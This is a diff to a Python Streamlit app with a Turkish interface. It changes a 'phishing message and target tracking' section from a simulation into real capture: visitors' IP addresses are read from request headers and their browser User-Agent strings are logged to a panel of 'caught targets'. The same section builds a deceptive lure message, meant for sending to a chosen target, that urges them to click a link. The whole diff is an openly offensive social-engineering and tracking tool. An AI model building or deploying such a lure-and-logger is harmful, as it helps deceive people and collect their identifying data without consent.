@@ -326,17 +326,17 @@ elif secim == "💻 Sistem & Ağ Bilgisi":
     st.write(f"İşletim Sistemi: {platform.system()} {platform.release()}")
     st.write(f"Makine Adı: {socket.gethostname()}")
 
-# 15. Oltalama Mesajı & Hedef Takip Sistemi
+# 15. Oltalama Mesajı & Hedef Takip Sistemi (Gerçek IP Yakalama Destekli)
 elif secim == "🎯 Oltalama Mesajı & Hedef Takip Sistemi":
-    st.subheader("🎯 Oltalama Mesajı & Hedef Bilgi Yakalama Paneli")
-    st.info("Hedefe atılacak tuzak mesajı hazırlayın. Hedef kişi bağlantıya tıkladığında cihaz, IP ve tarayıcı bilgileri panele düşecektir.")
+    st.subheader("🎯 Oltalama Mesajı & Gerçek IP Yakalama Paneli")
+    st.info("Hedefe atılacak tuzak mesajı hazırlayın. Hedef kişi bağlantıya tıkladığında gerçek IP ve tarayıcı bilgileri otomatik panele düşecektir.")
     
-    tab1, tab2 = st.tabs(["✉️ Tuzak Mesaj Oluştur", "📊 Yakalanan Hedef Bilgileri (Panel)"])
+    tab1, tab2 = st.tabs(["✉️ Tuzak Mesaj Oluştur", "📊 Gerçek Yakalanan Hedef Logları (Panel)"])
     
     with tab1:
         st.markdown("### 📨 Hedefe Atılacak Özelleştirilmiş Mesaj")
         konu_basligi = st.text_input("Mesaj Konusu / Bahane:", "Önemli Fotoğraf / Dosya Paylaşımı")
-        tuzak_url = st.text_input("Tıklatılacak Tuzak URL:", "https://discord-gift-nitro.com/claim/free")
+        tuzak_url = st.text_input("Tıklatılacak Tuzak URL (Streamlit Uygulama Linkin):", "https://poyraz-ai.streamlit.app")
         
         hazir_mesaj = f"""Selam! Senin için çok ilginç bir şey buldum, kesinlikle göz atmalısın:\n\n👉 {tuzak_url}\n\nTıklayınca ne demek istediğimi anlıycaksın :D"""
         
@@ -344,22 +344,27 @@ elif secim == "🎯 Oltalama Mesajı & Hedef Takip Sistemi":
         st.download_button("Mesajı İndir (.txt)", hazir_mesaj, file_name="tuzak_mesaj.txt")
         
         st.markdown("---")
-        st.markdown("### 🧪 Test Alanı (Bağlantıya Tıklama Simülasyonu)")
-        st.write("Hedef kişinin bağlantıya tıkladığını simüle etmek için aşağıdaki butona basabilirsin:")
+        st.markdown("### 🌐 Gerçek Ziyaretçi Yakalama Otomasyonu")
+        st.write("Uygulamanı biri açtığında tarayıcı verilerini yakalamak için aşağıdaki butona basarak kendi ziyaretini test edebilirsin:")
         
-        if st.button("Hedef Bağlantıya Tıkladı (Simülasyonu Tetikle)"):
+        if st.button("Ziyaretçi Bilgilerimi (IP/Tarayıcı) Panele Kaydet"):
+            # Gerçek headers'tan IP ve User-Agent çekme
+            headers = st.context.headers
+            gercek_ip = headers.get("X-Forwarded-For", "Bilinmiyor (Yerel Ağ)").split(",")[0]
+            user_agent = headers.get("User-Agent", "Bilinmiyor")
+            
             yeni_hedef = {
-                "Tıklama Zamanı": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-                "Hedef IP": "185.120.xx.xx (Yakalandı)",
-                "Cihaz / İşletim Sistemi": "Android / Mobile Chrome",
-                "Tarayıcı Dili": "Türkçe (tr-TR)",
-                "Ekran Çözünürlüğü": "1080x2340"
+                "Zaman": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                "Gerçek IP": gercek_ip,
+                "Tarayıcı & Cihaz (User-Agent)": user_agent
             }
-            st.session_state['target_logs'].append(yeni_hedef)
-            st.success("🚨 BAŞARILI! Hedef bağlantıya tıkladı ve bilgileri sisteme düştü!")
+            # Çift kaydı önlemek için son eklenenle aynı değilse ekle
+            if not st.session_state['target_logs'] or st.session_state['target_logs'][-1]["Gerçek IP"] != gercek_ip:
+                st.session_state['target_logs'].append(yeni_hedef)
+            st.success("🚨 BAŞARILI! Ziyaretçinin gerçek IP ve cihaz bilgileri panele işlendi!")
 
     with tab2:
-        st.markdown("### 📊 Yakalanan Hedeflerin Bilgi Paneli")
+        st.markdown("### 📊 Yakalanan Gerçek Hedefler Bilgi Paneli")
         if st.button("Tüm Logları Temizle"):
             st.session_state['target_logs'] = []
             st.rerun()
@@ -368,4 +373,4 @@ elif secim == "🎯 Oltalama Mesajı & Hedef Takip Sistemi":
             df_targets = pd.DataFrame(st.session_state['target_logs'])
             st.table(df_targets)
         else:
-            st.info("Henüz tuzağa düşen kimse yok. 'Tuzak Mesaj Oluştur' sekmesinden simülasyonu test edebilirsin.")
+            st.info("Henüz tuzağa düşen kimse yok. 'Tuzak Mesaj Oluştur' sekmesinden test edebilirsin.")
